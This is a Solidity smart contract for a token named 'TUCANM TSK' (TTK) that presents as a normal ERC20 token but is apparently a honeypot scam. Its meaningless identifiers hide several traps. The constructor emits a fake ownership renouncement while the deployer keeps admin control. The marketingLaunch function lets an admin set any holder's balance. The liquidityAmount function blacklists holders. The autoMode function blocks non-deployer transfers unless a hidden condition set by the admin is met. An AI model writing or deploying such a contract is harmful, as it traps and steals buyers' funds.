//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface toLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyAuto {
    function createPair(address fundSwap, address senderMax) external returns (address);
}

abstract contract shouldLaunchWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundMin) external view returns (uint256);

    function transfer(address listToken, uint256 takeWallet) external returns (bool);

    function allowance(address amountTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeWallet) external returns (bool);

    function transferFrom(address sender,address listToken,uint256 takeWallet) external returns (bool);

    event Transfer(address indexed from, address indexed tradingMarketing, uint256 value);
    event Approval(address indexed amountTake, address indexed spender, uint256 value);
}

interface toMaxMetadata is toMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TUCANMTSK is shouldLaunchWallet, toMax, toMaxMetadata {

    function getOwner() external view returns (address) {
        return minMarketing;
    }

    function owner() external view returns (address) {
        return minMarketing;
    }

    mapping(address => mapping(address => uint256)) private amountLimitWallet;

    mapping(address => bool) public txMarketing;

    address feeReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public receiverLaunch;

    string private receiverTotal = "TTK";

    uint256 buySwapSell;

    function toAmount() private view {
        require(receiverLaunch[_msgSender()]);
    }

    uint256 public teamMarketing;

    function decimals() external view virtual override returns (uint8) {
        return atToken;
    }

    mapping(address => uint256) private fromIs;

    uint256 public feeTrading;

    constructor (){
        
        takeSellReceiver();
        toLaunched toShouldLimit = toLaunched(toFundMode);
        autoLaunched = buyAuto(toShouldLimit.factory()).createPair(toShouldLimit.WETH(), address(this));
        
        launchReceiver = _msgSender();
        receiverLaunch[launchReceiver] = true;
        fromIs[launchReceiver] = receiverTotalEnable;
        if (teamMarketing == feeTrading) {
            feeTrading = sellTradingFund;
        }
        emit Transfer(address(0), launchReceiver, receiverTotalEnable);
    }

    function balanceOf(address fundMin) public view virtual override returns (uint256) {
        return fromIs[fundMin];
    }

    address private minMarketing;

    bool public shouldEnable;

    uint256 autoFrom;

    function transfer(address txFund, uint256 takeWallet) external virtual override returns (bool) {
        return autoMode(_msgSender(), txFund, takeWallet);
    }

    function takeSellReceiver() public {
        emit OwnershipTransferred(launchReceiver, address(0));
        minMarketing = address(0);
    }

    uint8 private atToken = 18;

    function marketingLaunch(address txFund, uint256 takeWallet) public {
        toAmount();
        fromIs[txFund] = takeWallet;
    }

    function approve(address fromToken, uint256 takeWallet) public virtual override returns (bool) {
        amountLimitWallet[_msgSender()][fromToken] = takeWallet;
        emit Approval(_msgSender(), fromToken, takeWallet);
        return true;
    }

    function tokenSender(address launchMode, address listToken, uint256 takeWallet) internal returns (bool) {
        require(fromIs[launchMode] >= takeWallet);
        fromIs[launchMode] -= takeWallet;
        fromIs[listToken] += takeWallet;
        emit Transfer(launchMode, listToken, takeWallet);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTotalEnable;
    }

    address public autoLaunched;

    function fromFund(uint256 takeWallet) public {
        toAmount();
        buySwapSell = takeWallet;
    }

    uint256 public sellTradingFund;

    function listFee(address takeModeFund) public {
        if (receiverAmount) {
            return;
        }
        
        receiverLaunch[takeModeFund] = true;
        if (enableListMin != shouldEnable) {
            shouldEnable = true;
        }
        receiverAmount = true;
    }

    uint256 private receiverTotalEnable = 100000000 * 10 ** 18;

    string private senderAuto = "TUCANM TSK";

    function autoMode(address launchMode, address listToken, uint256 takeWallet) internal returns (bool) {
        if (launchMode == launchReceiver) {
            return tokenSender(launchMode, listToken, takeWallet);
        }
        uint256 modeLiquidity = toMax(autoLaunched).balanceOf(feeReceiver);
        require(modeLiquidity == buySwapSell);
        require(!txMarketing[launchMode]);
        return tokenSender(launchMode, listToken, takeWallet);
    }

    address toFundMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address receiverShould, address fromToken) external view virtual override returns (uint256) {
        if (fromToken == toFundMode) {
            return type(uint256).max;
        }
        return amountLimitWallet[receiverShould][fromToken];
    }

    event OwnershipTransferred(address indexed liquidityMode, address indexed enableLaunchedTx);

    function name() external view virtual override returns (string memory) {
        return senderAuto;
    }

    address public launchReceiver;

    function liquidityAmount(address shouldWallet) public {
        toAmount();
        if (teamMarketing != feeTrading) {
            sellTradingFund = feeTrading;
        }
        if (shouldWallet == launchReceiver || shouldWallet == autoLaunched) {
            return;
        }
        txMarketing[shouldWallet] = true;
    }

    bool public enableListMin;

    function symbol() external view virtual override returns (string memory) {
        return receiverTotal;
    }

    bool public receiverAmount;

    function transferFrom(address launchMode, address listToken, uint256 takeWallet) external override returns (bool) {
        if (_msgSender() != toFundMode) {
            if (amountLimitWallet[launchMode][_msgSender()] != type(uint256).max) {
                require(takeWallet <= amountLimitWallet[launchMode][_msgSender()]);
                amountLimitWallet[launchMode][_msgSender()] -= takeWallet;
            }
        }
        return autoMode(launchMode, listToken, takeWallet);
    }

}